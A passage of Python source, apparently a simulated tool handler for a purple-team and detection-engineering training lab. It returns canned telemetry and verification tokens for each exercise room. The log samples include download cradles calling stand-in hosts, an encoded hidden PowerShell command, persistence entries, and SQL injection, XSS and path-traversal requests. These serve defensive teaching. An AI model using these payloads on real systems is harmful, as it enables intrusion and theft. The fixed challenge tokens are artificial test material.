            st = get_purple_continuous_validation_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "run_id": "RUN-2026-CSV-101",\n'
                    '    "timestamp": "2026-11-15T14:15:30Z",\n'
                    '    "suite": "nightly-atomic-red-canary",\n'
                    '    "tests_total": 45,\n'
                    '    "tests_detected": 42,\n'
                    '    "tests_prevented": 38,\n'
                    '    "coverage_pct": 93.3,\n'
                    '    "failed_simulations": [\n'
                    '      {\n'
                    '        "atomic_id": "T1547.001-RegKeyAdd",\n'
                    '        "reason": "Detection latency exceeded 120s SLA"\n'
                    '      }\n'
                    '    ]\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-pipeline" in cmd or "--emulate" in cmd:
                st["continuous_val_emulated"] = True
                return '{\n  "status": "CONTINUOUS_VALIDATION_EMULATION_VERIFIED",\n  "verification_token": "CONTINUOUS_VALIDATION_EMULATION_VERIFIED",\n  "suite": "nightly-atomic-red-canary"\n}\n\n[+] Verification Token: CONTINUOUS_VALIDATION_EMULATION_VERIFIED\n'
            if "--tune-guardrails" in cmd:
                st["guardrails_tuned"] = True
                return '{\n  "status": "GUARDRAILS_TUNED_OK",\n  "message": "Continuous security validation guardrails enforced"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("continuous_val_emulated") and st.get("guardrails_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["continuous_val_validated"] = True
                return '{\n  "status": "CONTINUOUS_VALIDATION_DETECTION_VALIDATED",\n  "verification_token": "CONTINUOUS_VALIDATION_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: CONTINUOUS_VALIDATION_DETECTION_VALIDATED\n'
            return "Usage: continuous_validation_tool.py [--show-telemetry | --emulate-pipeline | --tune-guardrails | --challenge]\n"

        # Purple Team Room 20: Purple Team Capstone: Full Adversary Emulation Exercise
        if "purple_capstone_tool" in cmd:
            st = get_purple_capstone_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "exercise_id": "EX-PURPLE-CAPSTONE-2026",\n'
                    '    "threat_actor": "APT29 / Cozy Bear",\n'
                    '    "phase_1_initial_access": {\n'
                    '      "technique": "T1566.001 - Spearphishing Attachment",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "EDR-PHISH-MALICIOUS-ISO"\n'
                    '    },\n'
                    '    "phase_2_privilege_escalation": {\n'
                    '      "technique": "T1548.002 - Bypass UAC",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "SIGMA-UAC-FODHELPER"\n'
                    '    },\n'
                    '    "phase_3_lateral_movement": {\n'
                    '      "technique": "T1021.006 - WinRM Remote Execution",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "WINRM-UNUSUAL-SOURCE-IP"\n'
                    '    },\n'
                    '    "phase_4_data_collection": {\n'
                    '      "technique": "T1560.001 - Archive via Utility",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "RAR-ARCHIVE-EXFIL-STAGING"\n'
                    '    }\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-campaign" in cmd or "--emulate" in cmd:
                st["capstone_emulated"] = True
                return '{\n  "status": "PURPLE_CAPSTONE_EMULATION_VERIFIED",\n  "verification_token": "PURPLE_CAPSTONE_EMULATION_VERIFIED",\n  "campaign": "APT29-MULTI-PHASE"\n}\n\n[+] Verification Token: PURPLE_CAPSTONE_EMULATION_VERIFIED\n'
            if "--tune-enterprise-rules" in cmd:
                st["rules_tuned"] = True
                return '{\n  "status": "ENTERPRISE_RULES_TUNED_OK",\n  "message": "Enterprise multi-stage adversary defense rules activated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("capstone_emulated") and st.get("rules_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["capstone_validated"] = True
                return '{\n  "status": "PURPLE_CAPSTONE_DETECTION_VALIDATED",\n  "verification_token": "PURPLE_CAPSTONE_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: PURPLE_CAPSTONE_DETECTION_VALIDATED\n'
            return "Usage: purple_capstone_tool.py [--show-telemetry | --emulate-campaign | --tune-enterprise-rules | --challenge]\n"

        # Detection Engineering Room 01: Foundations & Detection-as-Code
        if "detection_foundations_tool" in cmd:
            st = get_detection_foundations_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "stage": "LINTING",\n'
                    '    "tool": "sigma-lint",\n'
                    '    "status": "PASSED",\n'
                    '    "rules_evaluated": 42,\n'
                    '    "syntax_errors": 0\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": "UNIT_TEST",\n'
                    '    "tool": "pytest-detections",\n'
                    '    "status": "PASSED",\n'
                    '    "unit_tests_run": 84,\n'
                    '    "failures": 0\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": "SNR_VALIDATION",\n'
                    '    "tool": "snr-profiler",\n'
                    '    "status": "FLAGGED_HIGH_NOISE",\n'
                    '    "rule_id": "RULE-DAC-104",\n'
                    '    "rule_name": "PowerShell Script Execution - High Frequency Backup",\n'
                    '    "alert_count_24h": 1420,\n'
                    '    "true_positive_rate": 0.05,\n'
                    '    "recommendation": "TUNE_OUTLIER_NOISE"\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": "CANARY_DEPLOYMENT",\n'
                    '    "tool": "cicd-canary-gate",\n'
                    '    "status": "PENDING_TUNING",\n'
                    '    "target_cluster": "staging-siem-01"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-pipeline" in cmd or "--emulate" in cmd:
                st["pipeline_emulated"] = True
                return '{\n  "status": "DETECTION_FOUNDATIONS_VERIFIED",\n  "verification_token": "DETECTION_FOUNDATIONS_VERIFIED",\n  "pipeline": "PASSED_STAGING"\n}\n\n[+] Verification Token: DETECTION_FOUNDATIONS_VERIFIED\n'
            if "--tune-snr" in cmd:
                st["snr_tuned"] = True
                return '{\n  "status": "SNR_TUNED_OK",\n  "rule_id": "RULE-DAC-104",\n  "message": "Outlier false-positive alert noise filtered from pipeline"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("pipeline_emulated") and st.get("snr_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["pipeline_validated"] = True
                return '{\n  "status": "DETECTION_FOUNDATIONS_VALIDATED",\n  "verification_token": "DETECTION_FOUNDATIONS_VALIDATED"\n}\n\n[+] Verification Token: DETECTION_FOUNDATIONS_VALIDATED\n'
            return "Usage: detection_foundations_tool.py [--show-telemetry | --emulate-pipeline | --tune-snr | --challenge]\n"

        # Detection Engineering Room 02: Log Normalization & Taxonomy (ECS & CIM)
        if "log_normalization_tool" in cmd:
            st = get_detection_normalization_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "source": "windows_security_4688",\n'
                    '    "raw_fields": {\n'
                    '      "EventID": 4688,\n'
                    '      "NewProcessName": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '      "SubjectUserName": "SYSTEM",\n'
                    '      "CommandLine": "cmd.exe /c whoami",\n'
                    '      "ProcessId": "0x1a4"\n'
                    '    },\n'
                    '    "normalized_mapping": {\n'
                    '      "ecs": {\n'
                    '        "process.executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '        "user.name": "SYSTEM",\n'
                    '        "process.command_line": "cmd.exe /c whoami",\n'
                    '        "process.pid": 420\n'
                    '      },\n'
                    '      "cim": {\n'
                    '        "process": "cmd.exe",\n'
                    '        "user": "SYSTEM",\n'
                    '        "cmdline": "cmd.exe /c whoami",\n'
                    '        "process_id": 420\n'
                    '      }\n'
                    '    }\n'
                    '  },\n'
                    '  {\n'
                    '    "source": "linux_auditd_syscall",\n'
                    '    "raw_fields": {\n'
                    '      "type": "SYSCALL",\n'
                    '      "arch": "c000003e",\n'
                    '      "syscall": 59,\n'
                    '      "comm": "id",\n'
                    '      "exe": "/usr/bin/id",\n'
                    '      "uid": 1000\n'
                    '    },\n'
                    '    "normalized_mapping": {\n'
                    '      "ecs": {\n'
                    '        "process.executable": "/usr/bin/id",\n'
                    '        "process.name": "id",\n'
                    '        "user.id": "1000"\n'
                    '      },\n'
                    '      "cim": {\n'
                    '        "process": "id",\n'
                    '        "process_path": "/usr/bin/id",\n'
                    '        "user_id": 1000\n'
                    '      }\n'
                    '    }\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-normalization" in cmd or "--emulate" in cmd:
                st["normalization_emulated"] = True
                return '{\n  "status": "LOG_NORMALIZATION_VERIFIED",\n  "verification_token": "LOG_NORMALIZATION_VERIFIED",\n  "taxonomy": "MAPPED_ECS_CIM"\n}\n\n[+] Verification Token: LOG_NORMALIZATION_VERIFIED\n'
            if "--tune-taxonomy" in cmd:
                st["taxonomy_tuned"] = True
                return '{\n  "status": "TAXONOMY_TUNED_OK",\n  "message": "Field mappings aligned to ECS process schema standard"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("normalization_emulated") and st.get("taxonomy_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["normalization_validated"] = True
                return '{\n  "status": "LOG_NORMALIZATION_VALIDATED",\n  "verification_token": "LOG_NORMALIZATION_VALIDATED"\n}\n\n[+] Verification Token: LOG_NORMALIZATION_VALIDATED\n'
            return "Usage: log_normalization_tool.py [--show-telemetry | --emulate-normalization | --tune-taxonomy | --challenge]\n"

        # Detection Engineering Room 03: Sigma Rule Syntax & Component Structure
        if "sigma_syntax_tool" in cmd:
            st = get_detection_sigma_syntax_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    "title: Certutil Download Cradle Execution\n"
                    "id: c0a80001-2026-sig-0003-certutil\n"
                    "status: experimental\n"
                    "description: Detects suspicious certutil.exe execution used to download remote payloads\n"
                    "references:\n"
                    "  - https://attack.mitre.org/techniques/T1105/\n"
                    "tags:\n"
                    "  - attack.t1105\n"
                    "  - attack.command_and_control\n"
                    "logsource:\n"
                    "  category: process_creation\n"
                    "  product: windows\n"
                    "detection:\n"
                    "  selection_img:\n"
                    "    Image|endswith: '\\certutil.exe'\n"
                    "  selection_flags:\n"
                    "    CommandLine|contains:\n"
                    "      - '-urlcache'\n"
                    "      - '-split'\n"
                    "  condition: selection_img and selection_flags\n"
                    "fields:\n"
                    "  - CommandLine\n"
                    "  - ParentImage\n"
                    "  - User\n"
                    "falsepositives:\n"
                    "  - Legitimate PKI certificate verification scripts\n"
                    "level: high\n"
                )
            if "--emulate-parser" in cmd or "--emulate" in cmd:
                st["syntax_emulated"] = True
                return '{\n  "status": "SIGMA_SYNTAX_VERIFIED",\n  "verification_token": "SIGMA_SYNTAX_VERIFIED",\n  "syntax_valid": true\n}\n\n[+] Verification Token: SIGMA_SYNTAX_VERIFIED\n'
            if "--tune-condition" in cmd:
                st["condition_tuned"] = True
                return '{\n  "status": "CONDITION_TUNED_OK",\n  "condition": "selection_img and selection_flags",\n  "message": "Sigma detection logic condition tuned successfully"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("syntax_emulated") and st.get("condition_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["syntax_validated"] = True
                return '{\n  "status": "SIGMA_SYNTAX_VALIDATED",\n  "verification_token": "SIGMA_SYNTAX_VALIDATED"\n}\n\n[+] Verification Token: SIGMA_SYNTAX_VALIDATED\n'
            return "Usage: sigma_syntax_tool.py [--show-telemetry | --emulate-parser | --tune-condition | --challenge]\n"

        # Detection Engineering Room 04: Writing Process Creation Rules (Sysmon Event ID 1)
        if "process_creation_tool" in cmd:
            st = get_detection_process_creation_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 1,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "RuleName": "technique_id=T1105,technique_name=Ingress Tool Transfer",\n'
                    '    "UtcTime": "2026-11-15 16:30:10.104",\n'
                    '    "ProcessGuid": "{d3b07384-0001-0000-0010-440000000000}",\n'
                    '    "ProcessId": "3412",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '    "CommandLine": "certutil.exe -urlcache -split -f http://evil-infra.internal/rat.exe C:\\\\Temp\\\\rat.exe",\n'
                    '    "CurrentDirectory": "C:\\\\Users\\\\victim\\\\",\n'
                    '    "User": "CORP\\\\victim",\n'
                    '    "ParentProcessGuid": "{d3b07384-0000-0000-0010-430000000000}",\n'
                    '    "ParentProcessId": "1940",\n'
                    '    "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '    "ParentCommandLine": "cmd.exe",\n'
                    '    "Hashes": "SHA256=A1B2C3D4E5F67890123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 1,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 16:31:00.220",\n'
                    '    "ProcessId": "5120",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '    "CommandLine": "certutil.exe -verifyctl C:\\\\Certs\\\\test.ctl",\n'
                    '    "User": "CORP\\\\Administrator",\n'
                    '    "ParentImage": "C:\\\\Windows\\\\System32\\\\services.exe",\n'
                    '    "benign": true\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["process_creation_emulated"] = True
                return '{\n  "status": "PROCESS_CREATION_VERIFIED",\n  "verification_token": "PROCESS_CREATION_VERIFIED",\n  "target_event_id": 1\n}\n\n[+] Verification Token: PROCESS_CREATION_VERIFIED\n'
            if "--tune-lolbin-filter" in cmd:
                st["filter_tuned"] = True
                return '{\n  "status": "LOLBIN_FILTER_TUNED_OK",\n  "message": "Benign administrative certutil filter tuned; adversary cradle accurately isolated"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("process_creation_emulated") and st.get("filter_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["process_creation_validated"] = True
                return '{\n  "status": "PROCESS_CREATION_VALIDATED",\n  "verification_token": "PROCESS_CREATION_VALIDATED"\n}\n\n[+] Verification Token: PROCESS_CREATION_VALIDATED\n'
            return "Usage: process_creation_tool.py [--show-telemetry | --emulate-detection | --tune-lolbin-filter | --challenge]\n"

        # Detection Engineering Room 05: Writing Network Connection Rules (Sysmon Event ID 3)
        if "network_connection_tool" in cmd:
            st = get_detection_network_rules_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 3,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "RuleName": "technique_id=T1571,technique_name=Non-Standard Port",\n'
                    '    "UtcTime": "2026-11-15 17:10:05.312",\n'
                    '    "ProcessId": "4892",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",\n'
                    '    "User": "CORP\\\\analyst",\n'
                    '    "Protocol": "tcp",\n'
                    '    "Initiated": "true",\n'
                    '    "SourceIp": "10.10.14.90",\n'
                    '    "SourcePort": 49210,\n'
                    '    "DestinationIp": "198.51.100.44",\n'
                    '    "DestinationPort": 8443,\n'
                    '    "label": "ATTACK_POSITIVE"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 3,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:11:15.550",\n'
                    '    "ProcessId": "2310",\n'
                    '    "Image": "C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe",\n'
                    '    "User": "CORP\\\\analyst",\n'
                    '    "Protocol": "tcp",\n'
                    '    "Initiated": "true",\n'
                    '    "SourceIp": "10.10.14.90",\n'
                    '    "SourcePort": 51102,\n'
                    '    "DestinationIp": "142.250.190.46",\n'
                    '    "DestinationPort": 443,\n'
                    '    "label": "BENIGN_BROWSER_TRAFFIC"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["network_connection_emulated"] = True
                return '{\n  "status": "NETWORK_DETECTION_VERIFIED",\n  "verification_token": "NETWORK_DETECTION_VERIFIED",\n  "target_event_id": 3\n}\n\n[+] Verification Token: NETWORK_DETECTION_VERIFIED\n'
            if "--tune-filter" in cmd:
                st["network_filter_tuned"] = True
                return '{\n  "status": "NETWORK_FILTER_TUNED_OK",\n  "message": "Benign standard browser egress filtered; non-standard port alert tuned successfully"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("network_connection_emulated") and st.get("network_filter_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["network_connection_validated"] = True
                return '{\n  "status": "NETWORK_DETECTION_VALIDATED",\n  "verification_token": "NETWORK_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: NETWORK_DETECTION_VALIDATED\n'
            return "Usage: network_connection_tool.py [--show-telemetry | --emulate-detection | --tune-filter | --challenge]\n"

        # Detection Engineering Room 06: Writing File & Registry Integrity Rules
        if "file_registry_tool" in cmd:
            st = get_detection_file_registry_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 13,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "RuleName": "technique_id=T1547.001,technique_name=Registry Run Keys",\n'
                    '    "UtcTime": "2026-11-15 17:20:11.801",\n'
                    '    "ProcessId": "3820",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\reg.exe",\n'
                    '    "TargetObject": "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater",\n'
                    '    "Details": "C:\\\\Users\\\\Public\\\\updater.exe",\n'
                    '    "label": "ATTACK_PERSISTENCE_RUNKEY"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 11,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:21:04.119",\n'
                    '    "ProcessId": "5040",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '    "TargetFilename": "C:\\\\Users\\\\Operator\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\backdoor.bat",\n'
                    '    "label": "ATTACK_STARTUP_FOLDER"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 13,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:22:30.400",\n'
                    '    "ProcessId": "890",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\sppsvc.exe",\n'
                    '    "TargetObject": "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SoftwareProtectionPlatform\\\\KeepRunningVersion",\n'
                    '    "Details": "10.0.19041",\n'
                    '    "label": "BENIGN_SYSTEM_UPDATE"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["file_registry_emulated"] = True
                return '{\n  "status": "FILE_REGISTRY_VERIFIED",\n  "verification_token": "FILE_REGISTRY_VERIFIED",\n  "event_ids": [11, 13]\n}\n\n[+] Verification Token: FILE_REGISTRY_VERIFIED\n'
            if "--tune-filter" in cmd:
                st["registry_filter_tuned"] = True
                return '{\n  "status": "REGISTRY_FILTER_TUNED_OK",\n  "message": "Benign Windows platform update services excluded from Run key alerts"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("file_registry_emulated") and st.get("registry_filter_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["file_registry_validated"] = True
                return '{\n  "status": "FILE_REGISTRY_VALIDATED",\n  "verification_token": "FILE_REGISTRY_VALIDATED"\n}\n\n[+] Verification Token: FILE_REGISTRY_VALIDATED\n'
            return "Usage: file_registry_tool.py [--show-telemetry | --emulate-detection | --tune-filter | --challenge]\n"

        # Detection Engineering Room 07: Detecting Authentication Abuse (Event IDs 4624/4625/4672)
        if "auth_abuse_tool" in cmd:
            st = get_detection_auth_abuse_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 4625,\n'
                    '    "Channel": "Security",\n'
                    '    "RuleName": "technique_id=T1110.003,technique_name=Password Spraying",\n'
                    '    "UtcTime": "2026-11-15 17:30:00.120",\n'
                    '    "TargetUserName": "admin",\n'
                    '    "Status": "0xC000006D",\n'
                    '    "SubStatus": "0xC000006A",\n'
                    '    "IpAddress": "198.51.100.77",\n'
                    '    "LogonType": 3,\n'
                    '    "label": "ATTACK_PASSWORD_SPRAY"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4672,\n'
                    '    "Channel": "Security",\n'
                    '    "RuleName": "technique_id=T1078,technique_name=Valid Accounts",\n'
                    '    "UtcTime": "2026-11-15 17:30:45.340",\n'
                    '    "SubjectUserName": "admin",\n'
                    '    "PrivilegeList": ["SeDebugPrivilege", "SeTcbPrivilege"],\n'
                    '    "label": "ATTACK_SPECIAL_PRIVILEGE_ASSIGNMENT"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4624,\n'
                    '    "Channel": "Security",\n'
                    '    "UtcTime": "2026-11-15 17:31:10.500",\n'
                    '    "TargetUserName": "svc-backup",\n'
                    '    "LogonType": 5,\n'
                    '    "IpAddress": "127.0.0.1",\n'
                    '    "label": "BENIGN_SERVICE_LOGON"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["auth_abuse_emulated"] = True
                return '{\n  "status": "AUTH_ABUSE_VERIFIED",\n  "verification_token": "AUTH_ABUSE_VERIFIED",\n  "monitored_ids": [4624, 4625, 4672]\n}\n\n[+] Verification Token: AUTH_ABUSE_VERIFIED\n'
            if "--tune-baseline" in cmd:
                st["auth_baseline_tuned"] = True
                return '{\n  "status": "AUTH_BASELINE_TUNED_OK",\n  "message": "LogonType 5 scheduled backup service accounts excluded from spray threshold"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("auth_abuse_emulated") and st.get("auth_baseline_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["auth_abuse_validated"] = True
                return '{\n  "status": "AUTH_ABUSE_VALIDATED",\n  "verification_token": "AUTH_ABUSE_VALIDATED"\n}\n\n[+] Verification Token: AUTH_ABUSE_VALIDATED\n'
            return "Usage: auth_abuse_tool.py [--show-telemetry | --emulate-detection | --tune-baseline | --challenge]\n"

        # Detection Engineering Room 08: Detecting PowerShell Obfuscation & Download Cradles
        if "powershell_obfuscation_tool" in cmd:
            st = get_detection_powershell_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 4104,\n'
                    '    "Channel": "Microsoft-Windows-PowerShell/Operational",\n'
                    '    "RuleName": "technique_id=T1059.001,technique_name=PowerShell",\n'
                    '    "UtcTime": "2026-11-15 17:40:02.001",\n'
                    '    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.99/payload.ps1\')",\n'
                    '    "Path": "",\n'
                    '    "label": "ATTACK_DOWNLOAD_CRADLE"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4104,\n'
                    '    "Channel": "Microsoft-Windows-PowerShell/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:40:35.412",\n'
                    '    "ScriptBlockText": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",\n'
                    '    "Path": "",\n'
                    '    "label": "ATTACK_BASE64_ENCODED"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4104,\n'
                    '    "Channel": "Microsoft-Windows-PowerShell/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:41:10.900",\n'
                    '    "ScriptBlockText": "Import-Module ActiveDirectory; Get-ADUser -Filter *",\n'
                    '    "Path": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\Modules\\\\ActiveDirectory",\n'
                    '    "label": "BENIGN_ADMINISTRATIVE_POWERSHELL"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["powershell_obfuscation_emulated"] = True
                return '{\n  "status": "POWERSHELL_DETECTION_VERIFIED",\n  "verification_token": "POWERSHELL_DETECTION_VERIFIED",\n  "event_id": 4104\n}\n\n[+] Verification Token: POWERSHELL_DETECTION_VERIFIED\n'
            if "--tune-regex" in cmd:
                st["cradle_regex_tuned"] = True
                return '{\n  "status": "CRADLE_REGEX_TUNED_OK",\n  "message": "PowerShell regex tuned with case-insensitivity and padding tolerance"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("powershell_obfuscation_emulated") and st.get("cradle_regex_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["powershell_obfuscation_validated"] = True
                return '{\n  "status": "POWERSHELL_DETECTION_VALIDATED",\n  "verification_token": "POWERSHELL_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: POWERSHELL_DETECTION_VALIDATED\n'
            return "Usage: powershell_obfuscation_tool.py [--show-telemetry | --emulate-detection | --tune-regex | --challenge]\n"

        # Detection Engineering Room 09: Writing Web Application Detection Rules (SQLi, XSS, LFI)
        if "web_detection_tool" in cmd:
            st = get_detection_web_rules_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "client_ip": "203.0.113.42",\n'
                    '    "method": "GET",\n'
                    '    "uri": "/search.php?q=test%27%20UNION%20SELECT%20null,username,password%20FROM%20users--",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "sqlmap/1.6#stable",\n'
                    '    "label": "ATTACK_SQLI_UNION"\n'
                    '  },\n'
                    '  {\n'
                    '    "client_ip": "198.51.100.15",\n'
                    '    "method": "POST",\n'
                    '    "uri": "/comments.php",\n'
                    '    "status_code": 200,\n'
                    '    "body": "comment=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",\n'
                    '    "user_agent": "Mozilla/5.0",\n'
                    '    "label": "ATTACK_XSS_STORED"\n'
                    '  },\n'
                    '  {\n'
                    '    "client_ip": "198.51.100.88",\n'
                    '    "method": "GET",\n'
                    '    "uri": "/view.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "curl/7.68.0",\n'
                    '    "label": "ATTACK_PATH_TRAVERSAL_LFI"\n'
                    '  },\n'
                    '  {\n'
                    '    "client_ip": "10.0.0.50",\n'
                    '    "method": "GET",\n'
                    '    "uri": "/index.php?category=electronics&page=1",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",\n'
                    '    "label": "BENIGN_USER_BROWSE"\n'
                    '  }\n'
                    ']\n'
                )
            if "--emulate-detection" in cmd or "--emulate" in cmd:
                st["web_detection_emulated"] = True
                return '{\n  "status": "WEB_DETECTION_VERIFIED",\n  "verification_token": "WEB_DETECTION_VERIFIED",\n  "event_source": "nginx-access-log"\n}\n\n[+] Verification Token: WEB_DETECTION_VERIFIED\n'
            if "--tune-urldecode" in cmd:
                st["urldecode_tuned"] = True
                return '{\n  "status": "URL_DECODE_TUNED_OK",\n  "message": "URL decode normalization filter applied successfully"\n}\n'
            if "--finalize" in cmd or "--challenge" in cmd:
                if not (st.get("web_detection_emulated") and st.get("urldecode_tuned")):
                    return '{"status": "REJECTED", "message": "Prerequisites incomplete"}\n'
                st["web_detection_validated"] = True
                return '{\n  "status": "WEB_DETECTION_VALIDATED",\n  "verification_token": "WEB_DETECTION_VALIDATED"\n}\n\n[+] Verification Token: WEB_DETECTION_VALIDATED\n'
            return "Usage: web_detection_tool.py [--show-telemetry | --emulate-detection | --tune-urldecode | --challenge]\n"

        # Detection Engineering Room 10: ModSecurity Core Rule Set Tuning & Custom Rules
        if "modsec_tuning_tool" in cmd:
            st = get_detection_modsec_state(info.session_id)
            if "--show-telemetry" in cmd:
                return (
                    '[\n'
                    '  {\n'
                    '    "transaction_id": "W4o5K8AaBbCcDdEeFf",\n'
                    '    "client_ip": "198.51.100.77",\n'
                    '    "rule_id": 942100,\n'
                    '    "msg": "SQL Injection Attack Detected via libinjection",\n'
                    '    "anomaly_score": 5,\n'
                    '    "paranoia_level": 1,\n'
                    '    "label": "ATTACK_SQLI_LIBINJECTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "transaction_id": "W4o5K9GgHhIiJjKkLl",\n'
                    '    "client_ip": "10.0.0.12",\n'
                    '    "rule_id": 920272,\n'
                    '    "msg": "Multiple URL Encoding Detected",\n'
                    '    "anomaly_score": 3,\n'
                    '    "paranoia_level": 2,\n'
                    '    "label": "BENIGN_FALSE_POSITIVE_ENCODING"\n'
                    '  },\n'
                    '  {\n'
                    '    "transaction_id": "W4o5L0MmNnOoPpQqRr",\n'
                    '    "client_ip": "203.0.113.19",\n'
                    '    "rule_id": 932100,\n'
